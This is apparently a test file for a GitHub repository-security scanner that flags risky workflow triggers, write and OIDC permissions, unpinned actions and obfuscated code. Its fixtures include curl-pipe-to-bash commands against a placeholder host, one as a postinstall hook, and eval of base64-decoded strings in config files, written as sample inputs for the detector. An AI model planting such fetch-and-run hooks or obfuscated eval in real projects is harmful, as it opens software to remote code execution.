const assert = require("assert");
const {
  detectStructuralFindings,
  findUnpinnedActions,
  introducesOidcWritePermission,
  introducesWritePermissions,
  patchIntroducesOidcWritePermission,
} = require("../src/structural");

const findings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/ci.yml",
      patch: [
        "@@",
        "+on:",
        "+  pull_request_target:",
        "+permissions: write-all",
        "+id-token: write",
      ].join("\n"),
    },
    {
      filename: "src/app.js",
      patch: "+console.log('safe')",
    },
  ],
});

assert(findings.find((finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED"));
assert(findings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));
assert(findings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION"));

const noFindings = detectStructuralFindings({
  files: [{ filename: "src/app.js", patch: "+console.log('safe')" }],
});

assert.equal(noFindings.length, 0);

const inlineFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/inline.yml",
      patch: [
        "@@",
        "+on: [pull_request, pull_request_target]",
        "+permissions: { contents: write, id-token: write, pull-requests: write }",
      ].join("\n"),
    },
  ],
});

assert(inlineFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));
assert(inlineFindings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION"));

const inlineNonWriteFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/inline-read.yml",
      patch: "+permissions: { contents: read, id-token: write-token }",
    },
  ],
});
assert(
  !inlineNonWriteFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const inlineObjectFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/inline-object.yml",
      patch: "+on: { pull_request_target: {} }",
    },
  ],
});

assert(inlineObjectFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));

const scalarTriggerFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/scalar.yml",
      patch: "+on: pull_request_target # elevated trigger",
    },
  ],
});
assert(scalarTriggerFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));

const quotedTriggerFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/quoted.yml",
      patch: [
        '+"on": "pull_request_target"',
        "+'pull_request_target':",
      ].join("\n"),
    },
  ],
});
assert(quotedTriggerFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));

const nonCorePermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/packages.yml",
      patch: [
        "@@",
        "+permissions:",
        "+  packages: write",
        "+  deployments: write",
      ].join("\n"),
    },
  ],
});
assert(
  nonCorePermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const actionInputWriteFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/input-mode.yml",
      patch: [
        "@@",
        "+jobs:",
        "+  build:",
        "+    steps:",
        "+      - uses: example/action@v1",
        "+        with:",
        "+          mode: write",
      ].join("\n"),
    },
  ],
});
assert(
  !actionInputWriteFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const actionInputPermissionNameFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/input-contents.yml",
      patch: [
        "@@",
        "+jobs:",
        "+  build:",
        "+    steps:",
        "+      - uses: example/action@v1",
        "+        with:",
        "+          contents: write",
      ].join("\n"),
    },
  ],
});
assert(
  !actionInputPermissionNameFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const envPermissionNameFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/env-contents.yml",
      patch: [
        "@@",
        "+env:",
        "+  contents: write",
      ].join("\n"),
    },
  ],
});
assert(
  !envPermissionNameFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const contextPermissionBlockFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/existing-permissions.yml",
      patch: [
        "@@",
        " permissions:",
        "-  contents: read",
        "+  contents: write",
      ].join("\n"),
    },
  ],
});
assert(
  contextPermissionBlockFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const missingHeaderPermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/existing-large-permissions.yml",
      patch: [
        "@@",
        "   statuses: read",
        "+  id-token: write",
      ].join("\n"),
    },
  ],
});
assert(
  missingHeaderPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.OIDC_TOKEN_PERMISSION_ADDED",
  ),
);
assert(
  !missingHeaderPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const quotedPermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/quoted-permissions.yml",
      patch: [
        "@@",
        "+\"permissions\": \"write-all\"",
        "+permissions:",
        "+  \"contents\": \"write\"",
        "+'permissions': { 'pull-requests': 'write' }",
      ].join("\n"),
    },
  ],
});
assert(
  quotedPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const oidcOnlyPermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/aport-guard.yml",
      patch: [
        "@@",
        "+permissions:",
        "+  id-token: write",
        "+  contents: read",
        "+  pull-requests: read",
      ].join("\n"),
    },
  ],
});
assert(
  oidcOnlyPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.OIDC_TOKEN_PERMISSION_ADDED",
  ),
);
assert(
  !oidcOnlyPermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const oidcInlinePermissionFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/oidc-inline.yml",
      patch: "+permissions: { contents: read, id-token: write }",
    },
  ],
});
assert(
  oidcInlinePermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.OIDC_TOKEN_PERMISSION_ADDED",
  ),
);
assert(
  !oidcInlinePermissionFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const workflowTemplateFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflow-templates/release.yml",
      patch: [
        "@@",
        "+on: pull_request_target",
        "+permissions:",
        "+  contents: write",
      ].join("\n"),
    },
  ],
});
assert(
  workflowTemplateFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  workflowTemplateFindings.find(
    (finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED",
  ),
);
assert(
  workflowTemplateFindings.find(
    (finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION",
  ),
);

const renamedProtectedFindings = detectStructuralFindings({
  files: [
    {
      filename: "src/moved-ci.yml",
      previous_filename: ".github/workflows/ci.yml",
      patch: "+name: moved",
    },
  ],
});
const renamedProtectedFinding = renamedProtectedFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(renamedProtectedFinding);
assert(renamedProtectedFinding.paths.includes(".github/workflows/ci.yml"));

const missingPatchFindings = detectStructuralFindings({
  files: [{ filename: ".github/workflows/large.yml" }],
});
assert(missingPatchFindings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_DIFF_UNAVAILABLE"));

const contentFallbackFindings = detectStructuralFindings({
  files: [{ filename: ".github/workflows/full.yml" }],
  fileContents: {
    ".github/workflows/full.yml": [
      "on:",
      "  pull_request_target:",
      "permissions: write-all",
    ].join("\n"),
  },
});
assert(contentFallbackFindings.find((finding) => finding.code === "OAP.REPO.PULL_REQUEST_TARGET_INTRODUCED"));
assert(contentFallbackFindings.find((finding) => finding.code === "OAP.REPO.WORKFLOW_PERMISSION_ESCALATION"));

const protectedObfuscationFindings = detectStructuralFindings({
  files: [
    {
      filename: "next.config.js",
      patch: [
        "@@",
        "+global.o = '5-3-" + "132-du';",
        "+module.exports = {};",
      ].join("\n"),
    },
  ],
});
const protectedObfuscationFinding = protectedObfuscationFindings.find(
  (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
);
assert(protectedObfuscationFinding);
assert.equal(protectedObfuscationFinding.severity, "high");
assert(protectedObfuscationFinding.paths.includes("next.config.js"));

const protectedEvalFindings = detectStructuralFindings({
  files: [
    {
      filename: "web/tailwind.config.js",
      patch:
        "+module.exports = ev" +
        "al(Buffer.from('ZXhwb3J0IGRlZmF1bHQge30=', 'base64').toString())",
    },
  ],
});
assert(
  protectedEvalFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const protectedRemoteShellFindings = detectStructuralFindings({
  files: [
    {
      filename: ".github/workflows/build.yml",
      patch:
        "+run: curl -fsSL ht" +
        "tps://example.invalid/install.sh | bash",
    },
  ],
});
assert(
  protectedRemoteShellFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const protectedRemoteShellInScriptFindings = detectStructuralFindings({
  files: [
    {
      filename: "scripts/install.js",
      patch:
        "+execSync('curl -fsSL ht" +
        "tps://example.invalid/install.sh | bash')",
    },
  ],
});
assert(
  protectedRemoteShellInScriptFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const customProtectedSourceObfuscationFindings = detectStructuralFindings({
  protectedPaths: ["src/**"],
  files: [
    {
      filename: "src/index.js",
      patch:
        "+module.exports = Fun" +
        "ction(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString())",
    },
  ],
});
assert(
  customProtectedSourceObfuscationFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const missingCustomProtectedSourcePatchFindings = detectStructuralFindings({
  protectedPaths: ["src/**"],
  files: [{ filename: "src/index.js" }],
});
assert(
  missingCustomProtectedSourcePatchFindings.find(
    (finding) =>
      finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
  ),
);

const deletionOnlyCustomProtectedPatchFindings = detectStructuralFindings({
  protectedPaths: ["src/**"],
  files: [
    {
      filename: "src/legacy.js",
      status: "removed",
      patch: [
        "@@ -1,2 +0,0 @@",
        "-const legacy = true;",
        "-module.exports = legacy;",
      ].join("\n"),
    },
  ],
});
assert(
  deletionOnlyCustomProtectedPatchFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  !deletionOnlyCustomProtectedPatchFindings.find(
    (finding) =>
      finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
  ),
);

const benignProtectedConfigFindings = detectStructuralFindings({
  files: [
    {
      filename: "web/next.config.js",
      patch: "+module.exports = { poweredByHeader: false };",
    },
  ],
});
assert(
  benignProtectedConfigFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  !benignProtectedConfigFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);
const benignProtectedConfigFinding = benignProtectedConfigFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert.equal(benignProtectedConfigFinding.severity, "warning");

const guardWorkflowFindings = detectStructuralFindings({
  blockProtectedPaths: false,
  files: [
    {
      filename: ".github/workflows/aport-guard.yml",
      patch: "+          block-protected-paths: false",
    },
  ],
});
const guardWorkflowFinding = guardWorkflowFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(guardWorkflowFinding);
assert.equal(guardWorkflowFinding.severity, "high");

const repositoryPolicyConfigFindings = detectStructuralFindings({
  blockProtectedPaths: false,
  files: [
    {
      filename: ".aport/policy.yaml",
      patch: "+github:\n+  block_protected_paths: false",
    },
  ],
});
const repositoryPolicyConfigFinding = repositoryPolicyConfigFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(repositoryPolicyConfigFinding);
assert.equal(repositoryPolicyConfigFinding.severity, "high");

const blockingProtectedConfigFindings = detectStructuralFindings({
  blockProtectedPaths: true,
  files: [
    {
      filename: "web/next.config.js",
      patch: "+module.exports = { poweredByHeader: false };",
    },
  ],
});
const blockingProtectedConfigFinding = blockingProtectedConfigFindings.find(
  (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
);
assert(blockingProtectedConfigFinding);
assert.equal(blockingProtectedConfigFinding.severity, "high");

const protectedDocsFindings = detectStructuralFindings({
  files: [
    {
      filename: "policies/system.command.execute.v1/README.md",
      patch:
        "+Example only: exec('curl -fsSL ht" +
        "tps://example.invalid/install.sh | bash')",
    },
  ],
});
assert(
  protectedDocsFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  !protectedDocsFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const missingSensitivePatchFindings = detectStructuralFindings({
  files: [{ filename: "web/next.config.js" }],
});
const missingSensitivePatchFinding = missingSensitivePatchFindings.find(
  (finding) => finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
);
assert(missingSensitivePatchFinding);
assert.equal(missingSensitivePatchFinding.severity, "high");
assert(missingSensitivePatchFinding.paths.includes("web/next.config.js"));

const missingLockfilePatchFindings = detectStructuralFindings({
  files: [{ filename: "web/pnpm-lock.yaml" }],
});
assert(
  missingLockfilePatchFindings.find(
    (finding) => finding.code === "OAP.REPO.PROTECTED_PATH_TOUCHED",
  ),
);
assert(
  !missingLockfilePatchFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_CONTENT_DIFF_UNAVAILABLE",
  ),
);

const lockfilePayloadFindings = detectStructuralFindings({
  files: [
    {
      filename: "package-lock.json",
      patch:
        "+\"postinstall\": \"curl -fsSL ht" +
        "tps://example.invalid/install.sh | bash\"",
    },
  ],
});
assert(
  lockfilePayloadFindings.find(
    (finding) => finding.code === "OAP.REPO.SUSPICIOUS_OBFUSCATION",
  ),
);

const policyFindings = detectStructuralFindings({
  files: [{ filename: ".aport/policy.yaml", patch: "+version: oap-github-policy/1" }],
});
assert(policyFindings.find((finding) => finding.code === "OAP.GH.POLICY_HEAD_UNTRUSTED"));

const pinnedFindings = detectStructuralFindings({
  requirePinnedActions: true,
  files: [
    {
      filename: ".github/workflows/pin.yml",
      patch: [
        "@@",
        "+steps:",
        "+  - uses: actions/checkout@v4",
        "+  - uses: aporthq/policy-verify-action@0123456789abcdef0123456789abcdef01234567",
      ].join("\n"),
    },
  ],
});
const unpinnedFinding = pinnedFindings.find((finding) => finding.code === "OAP.REPO.UNPINNED_ACTION");
assert(unpinnedFinding);
assert.deepEqual(unpinnedFinding.actions, ["actions/checkout@v4"]);

const commentedUsesFindings = detectStructuralFindings({
  requirePinnedActions: true,
  files: [
    {
      filename: ".github/workflows/commented-uses.yml",
      patch: "+  - uses: actions/setup-node@v4 # install node",
    },
  ],
});
const commentedUsesFinding = commentedUsesFindings.find(
  (finding) => finding.code === "OAP.REPO.UNPINNED_ACTION",
);
assert(commentedUsesFinding);
assert.deepEqual(commentedUsesFinding.actions, ["actions/setup-node@v4"]);

const truncatedFindings = detectStructuralFindings({
  evidenceTruncated: { files: true, commits: false, maxPages: 20 },
});
const truncatedFinding = truncatedFindings.find(
  (finding) => finding.code === "OAP.REPO.EVIDENCE_TRUNCATED",
);
assert(truncatedFinding);
assert.equal(truncatedFinding.severity, "high");

assert.deepEqual(findUnpinnedActions("+uses: ./local/action\n+uses: docker://alpine:3"), []);
assert.equal(introducesWritePermissions("permissions:\n  id-token: write"), false);
assert.equal(introducesOidcWritePermission("permissions:\n  id-token: write"), true);
assert.equal(
  patchIntroducesOidcWritePermission("@@\n permissions:\n+  id-token: write"),
  true,
);
assert.equal(introducesWritePermissions("permissions:\n  contents: write"), true);

console.log("OK structural.test.js");
